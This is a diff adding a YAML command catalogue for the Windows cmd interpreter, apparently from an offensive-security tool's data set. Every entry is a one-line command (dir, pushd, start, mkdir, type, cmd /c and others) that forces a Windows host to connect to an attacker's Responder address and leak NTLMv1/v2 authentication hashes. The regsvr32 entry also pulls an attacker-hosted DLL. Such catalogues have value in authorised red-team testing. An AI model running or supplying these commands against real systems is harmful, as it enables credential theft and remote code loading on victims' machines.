@@ -1,0 +1,71 @@
+---
+name: cmd
+description: The Windows command interpreter
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Elicit an NTLMv1/v2 Authetication Leak (via dir)":
+    - type: ["cmd","standalone"]
+    - text: "dir \\\\{IPV4}\\C$"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via regsvr32)":
+    - type: ["cmd","standalone"]
+    - text: "regsvr32 /s /u /i://{IPV4}/{FILE}"
+    - input: ["attacker Responder IPv4 address","attacker-hosted DLL file"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via echo)":
+    - type: ["cmd","autonomous"]
+    - text: "echo 1 > //{IPV4}/blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via pushd)":
+    - type: ["cmd","standalone"]
+    - text: "pushd \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via cmd /k)":
+    - type: ["cmd","standalone"]
+    - text: "cmd /k \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via cmd /c)":
+    - type: ["cmd","standalone"]
+    - text: "cmd /c \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via start)":
+    - type: ["cmd","standalone"]
+    - text: "start \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via mkdir)":
+    - type: ["cmd","standalone"]
+    - text: "mkdir \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via type)":
+    - type: ["cmd","standalone"]
+    - text: "type \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
